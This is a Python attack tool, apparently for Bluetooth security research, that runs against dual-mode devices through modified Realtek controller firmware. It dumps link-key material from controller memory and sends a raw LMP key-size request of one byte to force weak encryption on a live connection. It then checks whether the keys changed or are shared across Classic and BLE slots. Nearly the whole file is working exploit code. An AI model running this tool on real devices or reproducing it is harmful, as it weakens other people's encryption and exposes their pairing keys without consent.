#!/usr/bin/env python3
"""BLURtooth / CTKD Probe for DarkFirmware RTL8761B.

Cross-Transport Key Derivation (CTKD) vulnerability — when a dual-mode device
derives BLE keys from Classic BR/EDR keys (or vice versa), compromising one
transport compromises both.

This tool:
1. Checks if target supports dual-mode (Classic + BLE)
2. Probes for CTKD by monitoring key derivation during pairing
3. Tests if weakening Classic encryption affects BLE security
4. Dumps connection table before/after to detect cross-transport key sharing

Usage:
    sudo python3 blurtooth_ctkd.py probe [--conn N]
    sudo python3 blurtooth_ctkd.py monitor [--conn N]

Requires: DarkFirmware loaded. Dual-mode target device.
"""

import sys
import os
import time
import struct
import argparse

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

import usbbluetooth
from darkfirmware_utils import find_realtek_device as _find_device
from scapy_usbbluetooth import UsbBluetoothSocket
from scapy.packet import Packet, bind_layers
from scapy.fields import ByteField, XLEIntField, XStrLenField
from scapy.layers.bluetooth import HCI_Hdr, HCI_Command_Hdr, HCI_Event_Command_Complete

MARKER_AAAA = 0x41414141
BOS_BASE = 0x8012DC50
SLOT_SIZE = 0x2B8  # 696 bytes (discovered via RE)

class HCI_Cmd_VSC_Realtek_Read_Mem(Packet):
    name = "Realtek Read Memory"
    fields_desc = [ByteField("size", 0x20), XLEIntField("address", 0x80000000)]
class HCI_Cmd_VSC_Xeno_Send_LMP(Packet):
    name = "Xeno VSC Send LMP"
    fields_desc = [XStrLenField("data", b"", length_from=lambda pkt: pkt.underlayer.underlayer.len)]
class HCI_Cmd_Complete_VSC(Packet):
    name = 'VSC complete'
    fields_desc = [XStrLenField("data", 0, length_from=lambda pkt: pkt.underlayer.underlayer.len)]

bind_layers(HCI_Command_Hdr, HCI_Cmd_VSC_Realtek_Read_Mem, ogf=0x3f, ocf=0x0061)
bind_layers(HCI_Command_Hdr, HCI_Cmd_VSC_Xeno_Send_LMP, ogf=0x3f, ocf=0x0222)
bind_layers(HCI_Event_Command_Complete, HCI_Cmd_Complete_VSC, opcode=0xfc61)
bind_layers(HCI_Event_Command_Complete, HCI_Cmd_Complete_VSC, opcode=0xfe22)


def find_device():
    return _find_device()


def read4(sock, addr):
    pkt = HCI_Hdr() / HCI_Command_Hdr() / HCI_Cmd_VSC_Realtek_Read_Mem(address=addr)
    try:
        resp = sock.sr1(pkt, verbose=0, timeout=2)
        if HCI_Event_Command_Complete in resp and resp[HCI_Event_Command_Complete].status == 0:
            data = resp.data
            return bytes(data[:4]) if isinstance(data, (bytes, bytearray)) else data.to_bytes(4, 'little')
    except Exception:
        pass
    return None


def read_bytes(sock, addr, count):
    data = bytearray()
    for off in range(0, count, 4):
        chunk = read4(sock, addr + off)
        data.extend(chunk if chunk else b'\x00\x00\x00\x00')
    return bytes(data[:count])


def send_lmp(sock, conn, data):
    payload = bytes([conn]) + data
    pkt = HCI_Hdr() / HCI_Command_Hdr(ogf=0x3f, ocf=0x0222) / HCI_Cmd_VSC_Xeno_Send_LMP(data=payload)
    return sock.sr1(pkt, verbose=0, timeout=2)


def dump_slot_key_areas(sock, slot):
    """Dump security-relevant areas of a connection slot."""
    bos_addr = BOS_BASE + (slot * SLOT_SIZE)

    # Read BD address
    bdaddr_data = read_bytes(sock, bos_addr, 8)
    bdaddr = bdaddr_data[:6]
    if all(b == 0 for b in bdaddr):
        return None

    bdaddr_str = ':'.join(f'{b:02X}' for b in reversed(bdaddr))

    # Read secondary struct pointer
    ptr_data = read4(sock, bos_addr + 0x58)
    if not ptr_data:
        return None
    sec_ptr = struct.unpack('<I', ptr_data)[0]
    if sec_ptr < 0x80000000:
        return None

    # Read key areas
    key_src = read_bytes(sock, sec_ptr + 0x02, 16)
    key_copy = read_bytes(sock, sec_ptr + 0x51, 16)
    key_size = read4(sock, sec_ptr + 0x23)
    enc_enabled = read4(sock, sec_ptr + 0x26)
    sc_flag = read4(sock, sec_ptr + 0x214)

    return {
        "bdaddr": bdaddr_str,
        "sec_ptr": sec_ptr,
        "key_src": key_src,
        "key_copy": key_copy,
        "key_size": key_size[0] if key_size else 0,
        "enc_enabled": enc_enabled[0] if enc_enabled else 0,
        "sc_flag": sc_flag[0] if sc_flag else 0,
    }


def probe_ctkd(sock, conn):
    """Probe for CTKD vulnerability."""
    print("\n" + "=" * 60)
    print("  BLURtooth / CTKD Vulnerability Probe")
    print("=" * 60)

    # Step 1: Check features — does target support dual-mode?
    print("\n[Step 1] Probing target features...")
    send_lmp(sock, conn, bytes([0x27]))  # FEATURES_REQ
    time.sleep(1)

    # Step 2: Dump key material BEFORE any attack
    print("\n[Step 2] Dumping key material (baseline)...")
    baseline = dump_slot_key_areas(sock, conn)
    if baseline is None:
        print("  [!] No active connection on slot {conn}")
        return

    print(f"  Target: {baseline['bdaddr']}")
    print(f"  Encryption: enabled={baseline['enc_enabled']}, key_size={baseline['key_size']}, SC={baseline['sc_flag']}")
    print(f"  Key src:  {baseline['key_src'].hex()}")
    print(f"  Key copy: {baseline['key_copy'].hex()}")

    # Step 3: Force weak Classic pairing
    print("\n[Step 3] Attempting Classic key weakening...")
    print("  Sending KEY_SIZE_REQ(key_size=1)...")
    send_lmp(sock, conn, bytes([0x10, 0x01]))
    time.sleep(2)

    # Step 4: Dump key material AFTER attack
    print("\n[Step 4] Dumping key material (post-attack)...")
    post = dump_slot_key_areas(sock, conn)
    if post is None:
        print("  [!] Connection lost during attack")
        return

    print(f"  Encryption: enabled={post['enc_enabled']}, key_size={post['key_size']}, SC={post['sc_flag']}")
    print(f"  Key src:  {post['key_src'].hex()}")
    print(f"  Key copy: {post['key_copy'].hex()}")

    # Step 5: Compare — did key material change?
    print("\n[Step 5] CTKD Analysis:")

    if baseline['key_src'] != post['key_src']:
        print(f"  [!!!] Key source CHANGED after Classic attack!")
        print(f"        Before: {baseline['key_src'].hex()}")
        print(f"        After:  {post['key_src'].hex()}")
        print(f"  This suggests key derivation was triggered — potential CTKD!")
    else:
        print(f"  [--] Key source unchanged")

    if baseline['key_copy'] != post['key_copy']:
        print(f"  [!!!] Key copy CHANGED after Classic attack!")
        print(f"        Before: {baseline['key_copy'].hex()}")
        print(f"        After:  {post['key_copy'].hex()}")
        print(f"  Cross-transport key derivation detected!")
    else:
        print(f"  [--] Key copy unchanged")

    if post['key_size'] < baseline['key_size']:
        print(f"  [!!] Key size REDUCED: {baseline['key_size']} → {post['key_size']}")

    # Step 6: Scan ALL 12 slots for shared key material
    print("\n[Step 6] Scanning all slots for shared key material...")
    target_key = post['key_copy'] if any(b != 0 for b in post['key_copy']) else post['key_src']

    if all(b == 0 for b in target_key):
        print("  [--] No key material to search for")
    else:
        for slot in range(12):
            if slot == conn:
                continue
            slot_data = dump_slot_key_areas(sock, slot)
            if slot_data and slot_data['bdaddr'] == post['bdaddr']:
                # Same device on different slot — check for key sharing
                if slot_data['key_copy'] == target_key or slot_data['key_src'] == target_key:
                    print(f"  [!!!] CTKD CONFIRMED: Slot {slot} ({slot_data['bdaddr']}) shares key material!")
                    print(f"        This is a BLE connection sharing Classic-derived keys!")

    print("\n" + "=" * 60)
    print("  BLURtooth Probe Complete")
    print("=" * 60)


def monitor_ctkd(sock, conn):
    """Continuously monitor key material changes."""
    print("[*] Monitoring key material for CTKD changes (Ctrl+C to stop)...")

    prev = dump_slot_key_areas(sock, conn)
    if prev is None:
        print("[!] No active connection")
        return

    print(f"[+] Monitoring slot {conn}: {prev['bdaddr']}")

    try:
        while True:
            time.sleep(2)
            curr = dump_slot_key_areas(sock, conn)
            if curr is None:
                print("[!] Connection lost")
                break

            changes = []
            for field in ['key_src', 'key_copy', 'key_size', 'enc_enabled', 'sc_flag']:
                if curr[field] != prev[field]:
                    changes.append(field)

            if changes:
                ts = time.strftime("%H:%M:%S")
                print(f"\n[{ts}] Key material CHANGED: {', '.join(changes)}")
                for field in changes:
                    old = prev[field].hex() if isinstance(prev[field], bytes) else str(prev[field])
                    new = curr[field].hex() if isinstance(curr[field], bytes) else str(curr[field])
                    print(f"  {field}: {old} → {new}")
                prev = curr
            else:
                print(".", end="", flush=True)

    except KeyboardInterrupt:
        print("\n[*] Stopped")


def main():
    parser = argparse.ArgumentParser(description="BLURtooth/CTKD Probe")
    parser.add_argument("command", choices=["probe", "monitor"], default="probe", nargs="?")
    parser.add_argument("--conn", type=int, default=0)
    args = parser.parse_args()

    ctrl = find_device()
    if not ctrl:
        print("[!] No device found")
        sys.exit(1)

    sock = UsbBluetoothSocket(ctrl)

    if args.command == "probe":
        probe_ctkd(sock, args.conn)
    elif args.command == "monitor":
        monitor_ctkd(sock, args.conn)


if __name__ == "__main__":
    main()
